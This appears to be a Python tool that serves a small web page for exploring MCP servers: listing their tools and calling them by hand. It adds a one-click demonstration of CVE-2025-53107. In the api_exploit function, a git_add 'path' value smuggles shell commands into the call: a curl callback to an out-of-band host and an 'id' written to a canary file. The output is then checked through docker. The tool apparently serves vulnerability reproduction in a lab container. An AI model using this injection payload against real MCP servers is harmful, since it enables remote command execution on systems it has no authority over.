#!/usr/bin/env python3
"""MCP 探索小页面（后端代理 + 静态页，纯标准库）。

功能：
  - 连接任意 MCP 服务（Streamable HTTP），展示工具的名称/描述/参数。
  - 任意工具手动调用，查看原始返回。
  - CVE-2025-53107 演示：对 git_add 注入命令，查看返回 + OOB 回连 + 容器内 canary。

运行：python3 app.py           # 监听 0.0.0.0:8088
浏览器访问 http://<服务器IP>:8088/ ，或经 SSH 隧道 http://127.0.0.1:8088/
"""
import json
import os
import re
import subprocess
import urllib.request
import uuid
from http.server import BaseHTTPRequestHandler, ThreadingHTTPServer

# 默认只绑本地回环；需对外时设环境变量 MCP_EXPLORER_HOST=0.0.0.0
WEB_HOST = os.environ.get("MCP_EXPLORER_HOST", "127.0.0.1")
WEB_PORT = int(os.environ.get("MCP_EXPLORER_PORT", "8099"))
OOB_QUERY = os.environ.get("OOB_QUERY", "http://127.0.0.1:9100/__hits")  # 查回连命中（本机或经隧道可达）


# ---------- 极简 MCP over Streamable HTTP 客户端 ----------

class MCP:
    def __init__(self, url):
        self.url = url
        self.sid = None

    def _post(self, method, params=None, notif=False):
        body = {"jsonrpc": "2.0", "method": method}
        if not notif:
            body["id"] = uuid.uuid4().hex[:6]
        if params is not None:
            body["params"] = params
        headers = {"Content-Type": "application/json",
                   "Accept": "application/json, text/event-stream"}
        if self.sid:
            headers["mcp-session-id"] = self.sid
        req = urllib.request.Request(self.url, data=json.dumps(body).encode(), headers=headers)
        r = urllib.request.urlopen(req, timeout=20)
        if r.headers.get("mcp-session-id"):
            self.sid = r.headers["mcp-session-id"]
        txt = r.read().decode("utf-8", "replace")
        for m in re.findall(r"data: (.*)", txt):
            try:
                obj = json.loads(m)
            except json.JSONDecodeError:
                continue
            if "result" in obj or "error" in obj:
                return obj
        return {"raw": txt}

    def handshake(self):
        info = self._post("initialize", {"protocolVersion": "2025-06-18",
                                          "capabilities": {},
                                          "clientInfo": {"name": "explorer", "version": "0"}})
        self._post("notifications/initialized", notif=True)
        return info

    def list_tools(self):
        return self._post("tools/list")

    def call(self, name, args):
        return self._post("tools/call", {"name": name, "arguments": args})


# ---------- API ----------

def api_connect(data):
    m = MCP(data["url"])
    info = m.handshake()
    tools = m.list_tools()
    return {"serverInfo": info.get("result", {}).get("serverInfo", info),
            "tools": tools.get("result", {}).get("tools", [])}


def api_call(data):
    m = MCP(data["url"])
    m.handshake()
    return {"result": m.call(data["tool"], data.get("args") or {})}


def api_exploit(data):
    """git_add 命令注入演示：回连 OOB + 写容器内 canary。"""
    token = "poc-" + uuid.uuid4().hex[:8]
    container = data.get("container", "mcp-cyanheads-git-mcp-server-2.1.4")
    payload = f'x" ; curl -s http://oob:9100/{token} ; id > /tmp/{token}.txt ; echo "'
    m = MCP(data["url"])
    m.handshake()
    res = m.call("git_add", {"path": payload, "files": "."})
    # 判定一：OOB 回连
    try:
        hit = json.loads(urllib.request.urlopen(f"{OOB_QUERY}?token={token}", timeout=10).read().decode())
    except Exception as e:
        hit = {"error": str(e)}
    # 判定二：容器内 canary（token 仅含十六进制，拼接安全）；本地无 Docker 时优雅跳过
    try:
        can = subprocess.run(["docker", "exec", container, "cat", f"/tmp/{token}.txt"],
                             capture_output=True, text=True)
        canary = can.stdout.strip() or can.stderr.strip() or "（无）"
    except FileNotFoundError:
        canary = "（本机无 docker，跳过——OOB 回连已足以证明）"
    return {"token": token, "payload": payload,
            "toolResult": res, "oob": hit, "canary": canary}


ROUTES = {"/api/connect": api_connect, "/api/call": api_call, "/api/exploit": api_exploit}


# ---------- HTTP 服务 ----------

class Handler(BaseHTTPRequestHandler):
    def _send(self, code, ctype, body):
        if isinstance(body, str):
            body = body.encode()
        self.send_response(code)
        self.send_header("Content-Type", ctype)
        self.send_header("Content-Length", str(len(body)))
        self.end_headers()
        self.wfile.write(body)

    def do_GET(self):
        if self.path == "/" or self.path.startswith("/?"):
            self._send(200, "text/html; charset=utf-8", PAGE)
        else:
            self._send(404, "text/plain", "not found")

    def do_POST(self):
        fn = ROUTES.get(self.path)
        if not fn:
            return self._send(404, "application/json", '{"error":"no route"}')
        try:
            length = int(self.headers.get("Content-Length") or 0)
            data = json.loads(self.rfile.read(length) or "{}")
            out = fn(data)
            self._send(200, "application/json", json.dumps(out, ensure_ascii=False))
        except Exception as e:
            self._send(200, "application/json", json.dumps({"error": f"{type(e).__name__}: {e}"}, ensure_ascii=False))

    def log_message(self, *a):
        pass


PAGE = """<!doctype html><html lang="zh"><head><meta charset="utf-8">
<meta name="viewport" content="width=device-width,initial-scale=1">
<title>MCP 探索器</title>
<style>
 body{font-family:system-ui,sans-serif;margin:0;background:#f5f5f5;color:#222;font-size:14px}
 header{background:#1f2937;color:#fff;padding:10px 16px;font-size:16px}
 main{max-width:960px;margin:0 auto;padding:16px}
 .card{background:#fff;border:1px solid #ddd;border-radius:6px;padding:14px;margin-bottom:16px}
 h2{font-size:15px;margin:0 0 10px}
 input,textarea{font-family:inherit;font-size:13px;border:1px solid #ccc;border-radius:4px;padding:6px;box-sizing:border-box}
 input[type=text]{width:100%}
 button{background:#2563eb;color:#fff;border:0;border-radius:4px;padding:7px 14px;cursor:pointer;font-size:13px}
 button:hover{background:#1d4ed8}
 button.danger{background:#dc2626}button.danger:hover{background:#b91c1c}
 button.sm{padding:4px 10px;font-size:12px}
 pre{background:#0f172a;color:#d1fae5;padding:10px;border-radius:4px;overflow:auto;white-space:pre-wrap;word-break:break-all;font-size:12px;max-height:340px}
 table{border-collapse:collapse;width:100%;font-size:12px}
 th,td{border:1px solid #e5e7eb;padding:5px 7px;text-align:left;vertical-align:top}
 th{background:#f3f4f6}
 .tool{border:1px solid #e5e7eb;border-radius:4px;margin-bottom:8px}
 .tool>summary{padding:8px 10px;cursor:pointer;font-weight:600}
 .tool>div{padding:10px;border-top:1px solid #eee}
 .muted{color:#6b7280}.ok{color:#16a34a;font-weight:700}.bad{color:#dc2626;font-weight:700}
 .row{display:flex;gap:8px;align-items:center}
 label{font-size:12px;color:#374151}
</style></head><body>
<header>MCP 探索器 <span class="muted" style="font-size:12px">· 连接 / 看工具 / 调用 / CVE 演示</span></header>
<main>

<div class="card">
 <h2>1. 连接 MCP 服务</h2>
 <div class="row">
   <input type="text" id="url" value="http://127.0.0.1:20001/mcp">
   <button onclick="connect()">连接</button>
 </div>
 <div id="serverInfo" class="muted" style="margin-top:8px">未连接</div>
</div>

<div class="card" id="toolsCard" style="display:none">
 <h2>2. 工具列表 <span class="muted" id="toolCount"></span></h2>
 <div id="tools"></div>
</div>

<div class="card">
 <h2>3. CVE-2025-53107 命令注入演示 <span class="muted">（git_add 的 path 参数）</span></h2>
 <p class="muted">点击执行：后端会用注入载荷调用 git_add，并检查 ① 容器内是否回连 OOB ② 注入的 <code>id</code> 命令是否真的执行（canary 文件）。</p>
 <div class="row">
   <label>容器名</label>
   <input type="text" id="container" value="mcp-cyanheads-git-mcp-server-2.1.4" style="flex:1">
   <button class="danger" onclick="exploit()">执行注入</button>
 </div>
 <div id="exploitOut"></div>
</div>

</main>
<script>
const $=s=>document.querySelector(s);
async function post(path,body){
  const r=await fetch(path,{method:"POST",headers:{"Content-Type":"application/json"},body:JSON.stringify(body)});
  return r.json();
}
function esc(s){return String(s).replace(/[&<>]/g,c=>({'&':'&amp;','<':'&lt;','>':'&gt;'}[c]));}

async function connect(){
  $("#serverInfo").textContent="连接中…";
  const d=await post("/api/connect",{url:$("#url").value});
  if(d.error){$("#serverInfo").innerHTML='<span class="bad">连接失败：</span>'+esc(d.error);$("#toolsCard").style.display="none";return;}
  $("#serverInfo").innerHTML='<span class="ok">连接成功</span> · '+esc(JSON.stringify(d.serverInfo));
  const tools=d.tools||[];
  $("#toolCount").textContent="共 "+tools.length+" 个";
  $("#tools").innerHTML=tools.map(renderTool).join("");
  $("#toolsCard").style.display="block";
}

function renderTool(t){
  const props=(t.inputSchema&&t.inputSchema.properties)||{};
  const req=(t.inputSchema&&t.inputSchema.required)||[];
  let rows=Object.keys(props).map(k=>{
    const p=props[k];
    return `<tr><td><b>${esc(k)}</b>${req.includes(k)?' <span class="bad">*</span>':''}</td>
            <td>${esc(p.type||'')}</td><td>${esc(p.description||'')}</td></tr>`;
  }).join("")||'<tr><td colspan=3 class="muted">无参数</td></tr>';
  const argObj={};Object.keys(props).forEach(k=>argObj[k]="");
  const id="args_"+t.name.replace(/\\W/g,"_");
  return `<details class="tool"><summary>${esc(t.name)}</summary><div>
    <div class="muted" style="margin-bottom:6px">${esc(t.description||'')}</div>
    <table><tr><th>参数</th><th>类型</th><th>描述</th></tr>${rows}</table>
    <div style="margin-top:8px">
      <label>调用参数（JSON）</label>
      <textarea id="${id}" style="width:100%;height:70px">${esc(JSON.stringify(argObj,null,2))}</textarea>
      <div style="margin-top:6px"><button class="sm" onclick='callTool("${esc(t.name)}","${id}")'>调用</button></div>
      <pre id="out_${id}" style="display:none"></pre>
    </div></div></details>`;
}

async function callTool(name,argId){
  let args;try{args=JSON.parse($("#"+argId).value||"{}");}catch(e){alert("参数不是合法 JSON");return;}
  const out=$("#out_"+argId);out.style.display="block";out.textContent="调用中…";
  const d=await post("/api/call",{url:$("#url").value,tool:name,args});
  out.textContent=JSON.stringify(d.result||d,null,2);
}

async function exploit(){
  const o=$("#exploitOut");o.innerHTML="<p class='muted'>执行中…</p>";
  const d=await post("/api/exploit",{url:$("#url").value,container:$("#container").value});
  if(d.error){o.innerHTML='<span class="bad">出错：</span>'+esc(d.error);return;}
  const oobHit=d.oob&&d.oob.hit;
  const canOk=d.canary&&d.canary.indexOf("uid=")>=0;
  o.innerHTML=`
   <p style="margin:10px 0 4px"><b>注入载荷</b>（填入 git_add 的 path）：</p><pre>${esc(d.payload)}</pre>
   <p style="margin:10px 0 4px"><b>工具返回</b>（服务器以为一切正常）：</p><pre>${esc(JSON.stringify(d.toolResult.result||d.toolResult,null,2))}</pre>
   <p style="margin:10px 0 4px"><b>判定一 · OOB 回连</b>：${oobHit?'<span class="ok">命中 ✅ 注入的 curl 已从容器内发出</span>':'<span class="bad">未命中</span>'}</p><pre>${esc(JSON.stringify(d.oob,null,2))}</pre>
   <p style="margin:10px 0 4px"><b>判定二 · 容器内 canary</b>（注入的 <code>id</code> 命令输出）：${canOk?'<span class="ok">命令已执行 ✅</span>':'<span class="bad">无</span>'}</p><pre>${esc(d.canary)}</pre>
   <p style="font-size:15px;margin-top:10px">结论：${(oobHit||canOk)?'<span class="ok">命令注入复现成功 ✅</span>':'<span class="bad">未触发</span>'}</p>`;
}
</script></body></html>"""


if __name__ == "__main__":
    print(f"MCP explorer on http://{WEB_HOST}:{WEB_PORT}/", flush=True)
    ThreadingHTTPServer((WEB_HOST, WEB_PORT), Handler).serve_forever()
